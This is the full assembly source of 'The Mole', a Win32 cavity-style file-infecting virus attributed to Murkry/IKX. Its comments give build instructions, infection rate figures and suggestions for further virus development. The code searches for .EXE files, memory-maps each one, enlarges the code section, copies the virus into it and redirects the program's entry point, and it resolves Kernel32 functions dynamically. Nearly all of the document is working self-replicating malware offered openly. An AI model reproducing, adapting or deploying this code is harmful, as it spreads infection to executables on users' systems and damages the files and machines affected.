;The Mole by Murkry\ikx
;A small win32 virus that uses memmap to expand the code section of a
;.exe then place its code there. Does not work on some Win98 files since
;MS in its infinite wisdom has made file aligment 1000h instead of 200h
;of course this makes this type of virus redunant since you do not need
;to expand the section odds are the file will have 400-800h bytes free anyway
;so the day of cavity infectors has come in the form of Win98 but sadly
;this virus does not infect Win98 type files. But it does infect WinNT
;A relative small change in code should rectify this.
;if the file infect mask is changed to *.dll it will work and if then
;return to *.exe it returns. This would be a intersting change for other
;students of vx to explore.

;To assemble
;tasm32 /ml /m3 mole;
;tlink32 /Tpe /aa /c /x  mole,mole,, import32.lib,  

;Tested in NT and Win95 works very well
;size just under 400h to get the date resest and control attributes
;it would need to be bigger say 600h;  

;A quick survey off 30 PE file in a win95 directory shows
; possible percent of files that can be infected versus size of
;virus of this type
;
;    400h       83%   
;    600h       60%
;    800h       50%
;    a00h       37%
;    c00h       20%
 
ViriiSize       equ     400h

.386
.model flat,stdcall

extrn           GetFileSize:PROC
extrn           ExitProcess:PROC

extrn           CreateFileA:PROC
extrn           CreateFileMappingA:PROC
extrn           MapViewOfFile:PROC
extrn           UnmapViewOfFile:PROC
extrn           CloseHandle:PROC

extrn           FindFirstFileA:PROC
extrn           FindNextFileA:PROC
extrn           FindClose:PROC
extrn           SetEndOfFile:PROC

FILE_MAP_COPY           EQU             000000001h
FILE_MAP_WRITE          EQU             000000002h
FILE_MAP_READ           EQU             000000004h
FILE_MAP_ALL_ACCESS     EQU             0000f001fh


INVALID_HANDLE_VALUE    EQU        -1

FILE_ATTRIBUTE_NORMAL           EQU             000000080h

GENERIC_READ    equ     80000000h
GENERIC_WRITE   equ     40000000h

OPEN_EXISTING   equ     3

PAGE_NOACCESS           EQU             000000001h
PAGE_READONLY           EQU             000000002h
PAGE_READWRITE          EQU             000000004h
PAGE_WRITECOPY          EQU             000000008h
PAGE_EXECUTE            EQU             000000010h
PAGE_EXECUTE_READ       EQU             000000020h
PAGE_EXECUTE_READWRITE  EQU             000000040h
PAGE_EXECUTE_WRITECOPY  EQU             000000080h
;Header Offsets

PEHeaderSze             EQU             0F8h
NumOfSects              EQU             06h
SizeOfCode              equ             1ch
ImageSze                equ             50h



;section offsets
VSize                   equ     8h
VAddress                equ     0Ch
SzeRawData              equ     10h
PtrRawData              equ     14h
HdrSze                  equ     28h

Find_data       equ 139h
Find_data_name  equ 2ch     ;where in the structure is the name
FileSizeH       equ 14h     ;if not zero get out      
Filesize        equ 20h     ;file size low
;find_file       db      Find_data dup(00)    ;size of the find data

;-------------------------------------------
;how the stack is used
SHandle         equ     0                ;Handle for the search routine
FHandle         equ     SHandle  + 4     ;Handle for open file
CMHandle        equ     FHandle  + 4     ;CreateMFileHandle
MHandle         equ     CMHandle + 4    ;Mhandle also address of where it is
FindFile        equ     MHandle  + 4

CFile           equ     FindFile + Find_data + 4
CFMap           equ     CFile    + 4
MapV            equ     CFMap    + 4
CloseH          equ     MapV     + 4
FindFirst       equ     CloseH   + 4
FindNext        equ     FindFirst + 4
CloseFnd        equ     FindNext + 4
UnMapV          equ     CloseFnd + 4
SetFEnd         equ     UnMapV   + 4 
Flag            equ     SetFEnd  + 3

GetProc         equ     Flag     + 4
K32Load         Equ     GetProc  + 4
HostPE          Equ     K32Load  + 4
HostLoad        equ     HostPE   + 4
Delta           equ     HostLoad + 4

WorkSpace       equ     GetProc 


;-------------------------------------------
.data                                   ;the data area
dummy           dd      ?               ;this needs some data
                                        ;or it won't compile ...easily

;-------------------------------------------
.code                                    

Mole:
                db      68h
HostEip         dd      offset fini -  00400000h

                Pusha

                call    GetAddie        ;this leaves some data on the stack
                                        ;which mole use's
D1:             sub     esp,WorkSpace 
                mov     ebp,esp
                sub     dword ptr[ebp + Delta],offset D1 - Offset Mole
                        ;this gives mole its location in memory

                 ;set return up to old eip
                mov     eax,dword ptr [ebp +  HostPE]
                add     dword ptr [ebp + Delta + 4 + (8*4)],eax
                 
                Call   GetFunctions    ;With the k32 module
                                       ;and GetProc we can now get all
                                       ;the Fuctions we want

                ;FINDFIRST
                lea     eax,[ebp + FindFile]
                push    eax

                mov     eax,[ebp + Delta]

                ;add     eax, offset FileN - Offset Mole
                add     eax, offset Fmask - Offset Mole
                push    eax
                call    dword ptr [ebp + FindFirst]

                mov     dword ptr [ebp + SHandle],eax
                inc     eax
                jz      NoFiles
                dec     eax                    
                  
TryItAgain:
                mov     byte ptr [ebp + Flag],0         ;assume too small
                call    Map_Infect?

                cmp     byte ptr[ebp + Flag],0
                jz      FindNextOne

                add     dword ptr [Ebp + FindFile +  Filesize],ViriiSize
                call    Map_Infect?

                ;call    Modify

FindNextOne:
                ;FINDNEXT
                lea     eax,[ebp + FindFile]
                push    eax

                mov     eax,[ebp + SHandle]
                push    eax

                call    dword ptr [ebp + FindNext]
                or      eax,eax
                jnz     TryItAgain


NoFiles:
                lea     eax,[ebp + FindFile]
                push    eax

                Call    dword ptr [ebp + CloseFnd]


                ADD     ESP,Delta + 4   ;restore all
                Popa

                ret                     ;return to the host

;--------------------------------------------------------------

Map_Infect?:

        xor     eax,eax
        cdq                                     ;edx = 0

        push    eax                             ;handle template

        ;push    FILE_ATTRIBUTE_NORMAL           ;attr flags
        mov     dl,80h
        push    edx

        push    large OPEN_EXISTING             ;creat flags

        push    eax                             ;security issue
        push    eax                             ;share mode 

        push    GENERIC_READ or GENERIC_WRITE   ;r\w access

        Lea     eax,[ebp + FindFile + Find_data_name]
        push    eax                             ;file name

        call    dword ptr [ebp + CFile]         ;CreateFileA

        inc     eax             ;smaller than cmp eax,-1, je...        
        jz      FileError       ;
        dec     eax             ;

;-------------------------------------------------------------
        cdq                     ;get edx = 0
        mov     [ebp + FHandle],eax         
;-------------------------------------------------------
;CreateFileMap object
;This is what will determine how big the file is
;when this is done the file size will be changed
;and of course the date is changed
 
        push    edx             ;fileMap name
 
 

        push    dword ptr [Ebp + FindFile +  Filesize]

 
        push    edx             ;file size high not use for this

        push    large PAGE_READWRITE  ;Protection Rights R/W etc
        push    edx             ;security attr
        push    eax             ;File Handle
        call    dword ptr [ ebp + CFMap ]       ;CreateFileMappingA
        cdq                     ;again zero edx
                                ;why here well ecx usual contains a
                                ;value like C??????? which when xchg
                                ;to eax when you us cdq edx = -1 not 0
        xchg    eax,ecx

        jecxz   MapHandleError

;-------------------------------------------------------------
        mov     [ebp + CMHandle],ecx         ;2nd FileMapHandle
;-------------------------------------------------------------
;Map the View
        

        push    edx                     ;size to map if 0 whole file
                                        ;in win95 its always does whole file
        push    edx                     ;where it file to start the mapping
                                        ;low word
        push    edx                     ;high word
        push    large FILE_MAP_WRITE    ;Acces rights
        push    ecx                     ;Map Handle
        call    dword ptr [ebp + MapV]  ;MapViewOfFile
        xchg    eax,ecx
        jecxz   ErrorFileMap
 
;--------------------------------------------------------------------------- 
        mov     dword ptr [ebp + MHandle],ecx  ;3rd Address of where its mapped
;---------------------------------------------------------------------------

;check for the oking of it then jmp out or back to close
;then reopen
;

        MOV     EDX,ECX

        MOV     Ebx,[EDX + 3CH] ;WHERE THE PE
        cmp     word ptr [ ebx+ edx],'EP'
        jne     NoRoom

        LEA     esi,[ebx + PEHeaderSze + edx]  ; esi = first Section Entry

        ;check for the section char is
        ;set for code

        test byte ptr [esi + 24h],20h
        JE     NoRoom

        ;FindOut if there is room to expand the file
        
        mov     ecx,[ESI + VAddress]
        add     ecx,[ESI + SzeRawData]
        mov     Eax,[ESI + VAddress + HdrSze ]

        sub     Eax,Ecx
        cmp     eax,ViriiSize 
        jl      NoRoom

        cmp     byte ptr [ebp + Flag],0          
        jne     Roomie

        inc     byte ptr [ebp + Flag]      

        jmp    GoodOpenSize

Roomie:
         
        call    Infect
       

NoRoom:

GoodOpenSize:  ;if called close file and get ready to infect

        push    dword ptr [ebp + MHandle]
        call    dword ptr [ebp + UnMapV]        ;UnmapViewOfFile

        
;-------------------------------------------------------------
         

ErrorFileMap:
        push dword ptr [ebp + CMHandle]          ;close file map handle
        call    dword ptr [ebp + CloseH]        ;CloseHandle             ;on stack Handle to the Map object

        

MapHandleError:
        push dword ptr [ebp + FHandle]
        call    dword ptr [ebp + CloseH]        ;file CloseHandle             ;on stack is the File open

         

FileError:
         
         ret

;-----------------------------------------------------------------
Infect:
;Ok do the move

        push    esi
        mov     edx,[ebp + MHandle]
        mov     eax,[esi + PtrRawData]
        add     eax,[esi + SzeRawData] ;where this section ends in the file


        mov     ecx,dword ptr [Ebp + FindFile +  Filesize]

        dec     ecx
        sub     ecx,ViriiSize
        lea     esi,[edx + ecx]         ;where to move the data from
        lea     edi,[edx + ecx + ViriiSize ] ;to
        inc     ecx
         
        sub     ecx,eax                 ;how much we move for 800h 
        std                             ;move backwards
        rep     movsb                   ;move it

        cld                             ;move forward again

        xchg    edi,esi
        inc     edi


        pop     esi
        push    esi
        
        mov     eax,[ebp + MHandle]
        add     eax,[eax + 3ch]         ;points to PE

        push    eax

        mov     eax,[eax+28h]           ;entry point RVA (Eip)
        mov     byte ptr [edi],68h      ;creates the push for the ret
        mov     dword ptr [edi + 1],eax ;to return to host

        pop     eax

        mov     ecx,[ebp + MHandle]
        add     ecx,[esi + PtrRawData]
        push    edi
        sub     edi,ecx
        add     edi,[esi + VAddress]
        ;inc    edi
        mov     dword ptr [eax +28h],edi        ;update the eip address
        pop     edi

        lea     edi,[edi + 5]   ;maybe 5 incs are better

        mov     esi,dword ptr [ebp + Delta]
        lea     esi,[esi + 5]
        mov     ecx,offset fini - offset Mole
        rep     movsb


        pop     esi             ;restore pointer to the section entries
        

        ;update the .code area size in the section
        add     dword ptr [esi + SzeRawData ],ViriiSize
        mov     eax,dword ptr [esi + SzeRawData]


        ;update this as well be better if we check if it needed to be
        ;enlarged???
        mov    dword ptr [esi + VSize],eax

        ;not updating the image size since we are not
        ;becoming bigger in memory aligment only file alignment
        ;in the header PE
        ;add     dword ptr [edx + ebx + ImageSze],ViriiSize


        ;Do update the code size in the Header area
        add     dword ptr [edx + ebx + SizeOfCode],ViriiSize

        ;now update the rest of the sections
        Movzx   ecx,word ptr [edx + ebx + NumOfSects]
        dec     ecx

;update the section entries pter to raw data as long as not 0
NextSect:
        add     esi, HdrSze
        cmp     dword ptr [esi + PtrRawData],0
        je      ZPter  
        add     dword ptr [esi + PtrRawData],ViriiSize
ZPter:  loop    NextSect

        ret


;--------------------------------------------------------------------------
;Used For GetAddie
K32             equ     0
BASE            equ     K32   + 4
Limit           equ     BASE + 4
AddFunc         equ     Limit + 4
AddName         equ     AddFunc + 4
AddOrd          equ     AddName+4 
Nindex          equ     AddOrd + 4
WorkSp          equ     Nindex + 4
GetPAdd         equ     WorkSp + 4
RetAdd          Equ     GetPAdd + 4
 

EdataLoc        equ     78h
IdataLoc        equ     80h

GetAddie:

        call    here
here:   pop     esi

        Call    GetPE    ;eax,esi               
        jne     GetAddie_fini

        push    eax    ;Address of PE header for this module
        push    esi    ;Load address of Module

        Call    GetK32API
        ;On return Esi = a API call in Kernel32

        Call    GetPE   ;eax,esi
        push    ESI      ;Module address of K32

        ;esi = to the load address Kernel32
        ;eax = address to the PE header of Kernel32
        push    large 0         ;hold the return info
        Call    GetGetProcessAdd
 
        
        push    dword ptr [esp + 10h]
          
GetAddie_fini:

        ret
 
;--------------------------------------------------------------
GetGetProcessAdd:
;esi = to the load address Kernel32
;eax = address to the PE header of Kernel32
;on return
;on the stack is the Address
         
        sub     esp,WorkSp
        mov     ebx,ebp

        mov     ebp,esp

        Pusha

        mov     dword ptr[ esp+ 8],ebx
 

        mov     [ebp + K32],Esi
        mov     ebx,esi

        mov     eax,[eax + EdataLoc]    ;gets us the Edata offset

        lea     esi,[eax + ebx + 10h]    ;pointer to  base

        lea     edi,[ebp+BASE]

        lodsd
        ;mov     [ebp + BASE],eax        ;save base
        stosd

        lodsd                           ;total number of exported functions
                                        ;by name and ordinal

        lodsd                           ;the functions exported by name
        ;mov     [ebp +Limit],eax        ;this is how far its safe to look
        stosd


        lodsd
        add     eax,ebx

        ;mov     [ebp + AddFunc],eax
        stosd

        lodsd
 
        add     eax,ebx
        ;mov     [ebp + AddName],eax
        stosd 

        lodsd
        add     eax,ebx  
        ;mov     [ebp + AddOrd],eax
        stosd


LookLoop:
        mov     esi,[ebp + AddName]
        mov     [EBP+Nindex],esi
        
        mov     edi,ebx                 ;get the load Add of K32
        add     edi,[esi]

        xor     ecx,ecx
TryAgain:
         
        ;find GetProcAddress
        cmp     [edi],'PteG'
        jne     NextOne

        cmp     [edi+4],'Acor'
        jne     NextOne

        cmp     [edi+8],'erdd' 
        jne     NextOne

        cmp     word ptr[edi+0Ch],'ss'
        jne     NextOne

        cmp     byte ptr [edi+0Eh],00
        jne     NextOne

       jmp     GotGetProcAdd

NextOne:
        inc     ecx
        cmp     ecx,[ebp + Limit]
        jge     NotFound1

        add     dword ptr [ebp + Nindex],4
        mov     ESI,[EBP+Nindex]
        mov     edi,[esi]
        add     edi,ebx
        jmp     TryAgain



GotGetProcAdd:
        ;ok we have the index into the name array use this to get
        ; the index into the ord array
        ;
        shl     ecx,1           ;*2 for a word array
        mov     esi,[ebp + AddOrd]
        add     esi,ecx         ;move to the correct spot in the array        

        movzx     eax,word ptr [esi]
        ;ax = ordinal value

        shl     eax,2           ;*4
        mov     esi,[ebp + AddFunc]
        add     esi,eax

        mov     edi, dword ptr [esi]
        add     edi,ebx                 ;got the address of it

        xchg    eax,edi
        mov     dword ptr [ebp + GetPAdd],eax
        jmp     OkFound

NotFound1:
 
        xor     eax,eax
OkFound:

  
        popa
        add    esp,WorkSp
 

        ret

;--------------------------------------------------------------
;ok at this point we have
;esi = to the load address of the program
;eax = address to the PE header now using this get the .idata area
;rather than use the .IDATA section we look for the more dependable
;idata entry in the idatrva section which is offset 80h into the PE header


GetK32API:
       push     ebx 
       mov      ebx,dword ptr [eax + IdataLoc]

       add      ebx,esi 

        ;Ebx now points to the import data table

NextDll:
       cmp      dword ptr [ebx+0ch],0
       je       NoIdataLeft
 
       lea      eax,[ebx+0ch]

       mov      eax,[eax]
       cmp      dword ptr [eax+esi],'NREK'
       jne      NotFound
       cmp      dword ptr [eax+esi+4],'23LE'
       jne      NotFound

       mov      eax,[ebx+10h]
       mov      eax,[eax+esi]

;next line is needed only in debug td32
;only in win95 not Winnt 4.0 at least so far
;       mov      eax,[eax+1]

 
       xchg     eax,esi
       pop      ebx
       ret

NoIdataLeft:
        xor     eax,eax
        pop     ebx
        ret

NotFound:
       add      ebx,14h
       jmp      NextDll
;---------------------------------------------------------
 
;Routine that will , given the address within a .exe in memory
;track back and find the MZ header then using this info one can
;find the Kernel32 (as long as the exe imports a kernel32 function
; on input
;esi = the address to start looking at
;on exit
;esi = the address of the MZ header
;eax = the address of the PE header

GetPE:

SetupSEH:
        push    offset FindExcept
        push    dword ptr fs:[0]
        mov     fs:[0],esp

LoopFind:
        and     esi,0FFFFF000h
        pusha
        lodsw
        cmp     ax,'ZM'
        je      Found
        popa
        sub     esi,1000h
        jmp     LoopFind

FindExcept:
        ;Some Exception occured assume "DEAD" area, reset and continue
        mov    eax,[esp +08h]
        lea    esp,[eax - 20h]
        popa                            ;restores our "REGS" esi mainly 
        pop     dword ptr fs:[0]        ;restore old handler
        add     esp,4                   ;remove last bit of hanlder
        sub     esi,1000h               ;Get set for next page to look at
        jmp     SetupSEH

Found:
        popa            ;esi = out MZ header
        pop     dword ptr fs:[0]
        add     esp,4

        Lea     eax,[esi + 3ch]
 
        mov     eax,[eax]
        add     eax,esi 

        cmp     word ptr ds:[eax],'EP'

        ret

;---------------------------------------------------------------
GetFunctions:
               Mov      esi,[ebp+ Delta] 
               add      esi,offset Funct_List - Offset Mole

               Lea      edi,dword ptr [ebp + CFile]

               ;mov      ecx,9           ;*
               xor      ecx,ecx
               mov      cl,9

startGetLoop:
               push     ecx

               push     Esi                     ;function name               
               Push     dword ptr [ ebp + K32Load] ;dll
               call     dword ptr [ebp + GetProc]
               stosd

               pop      ecx

               add      esi,13h         ;get next name
                
               Loop     startGetLoop

               ret

;---------------------------------------------------------------


;Data for The Mole
        
Funct_List:
        db      "CreateFileA",0             ;12
Fmask   db      "*.EXE",0                   ;5
        db      1 dup(90h)

        db      "CreateFileMappingA",0      ;19

        db      "MapViewOfFile",0           ;14
        db      5 dup(90h)

        db      "CloseHandle",0             ;12
        db      7 dup(90h)

        db      "FindFirstFileA",0          ;15
        db      4 dup(90h)

        db      "FindNextFileA",0           ;14
        db      5 dup(90h)

        db      "FindClose",0               ;10
        db      9 dup(90h)

        db      "UnmapViewOfFile",0         ;16
        db      3 dup(90h)
               
        db      "SetEndOfFile",0            ;13
        ;db      6 dup(90h)      
        db      'Murkry\IKX'

;=========================================================================

fini:

        push    LARGE -1
        call    ExitProcess             ;this simply terminates the program

        end     Mole
